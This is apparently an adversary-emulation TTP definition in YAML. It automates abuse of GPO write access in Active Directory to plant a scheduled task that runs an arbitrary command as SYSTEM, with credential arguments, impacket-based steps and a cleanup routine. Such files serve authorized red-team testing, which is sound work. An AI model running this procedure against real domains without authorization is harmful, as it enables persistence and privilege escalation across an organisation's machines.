---
api_version: 2.0
uuid: a4e2087a-541c-4c1d-b911-c36bb8ed418c
name: Abuse GPO Write Access to Add Scheduled Task
authors:
  - isaac_fletcher
description: |
  Abuses write access to a Group Policy Object (GPO) to create a scheduled task.
  Supports specifying an arbitrary user context to run the task as.
requirements:
  platforms:
    - os: linux
    - os: darwin
mitre:
  tactics:
    - TA0003 Persistence
    - TA0004 Privilege Escalation
  techniques:
    - T1484 Domain or Tenant Policy Modification
  subtechniques:
    - T1484.001 Group Policy Modification
args:
  - name: domain
    description: The target Active Directory domain (e.g., contoso.com)
    default: contoso.local
  - name: dc
    description: The Domain Controller IP or hostname to target
    default: dc01.contoso.local
  - name: username
    description: Username for authentication (without domain prefix)
  - name: password
    description: Password for authentication
  - name: gpo_id
    description: The GPO GUID to modify (e.g., 12345677-ABCD-9876-ABCD-123456789012)
  - name: command
    description: Command to execute via scheduled task
    default: "whoami > C:\\Windows\\Temp\\task.txt"
  - name: taskname
    description: Name of the scheduled task to create
    default: "GPOAbuseTask"
  - name: run_as
    description: User context to run the task as
    default: "NT AUTHORITY\\System"
  - name: description
    description: Description of the scheduled task
    default: "Scheduled task created via GPO abuse"
steps:
  - name: setup_deps
    description: Install impacket and ldap3
    ttp: //utils/pip-install/ttp.yaml
    args:
      modules: "impacket ldap3"

  - name: add_scheduled_task
    description: Add a scheduled task to the target GPO
    inline: |
      python3 gpo_scheduled_task.py \
        '{{.Args.domain}}/{{.Args.username}}:{{.Args.password}}' \
        -dc-ip '{{.Args.dc}}' \
        -gpo-id '{{.Args.gpo_id}}' \
        -command '{{.Args.command}}' \
        -taskname '{{.Args.taskname}}' \
        -run-as '{{.Args.run_as}}' \
        -description '{{.Args.description}}' \
        -v
    cleanup:
      inline: |
        python3 gpo_scheduled_task.py \
          '{{.Args.domain}}/{{.Args.username}}:{{.Args.password}}' \
          -dc-ip '{{.Args.dc}}' \
          -gpo-id '{{.Args.gpo_id}}' \
          -taskname '{{.Args.taskname}}' \
          --cleanup -v
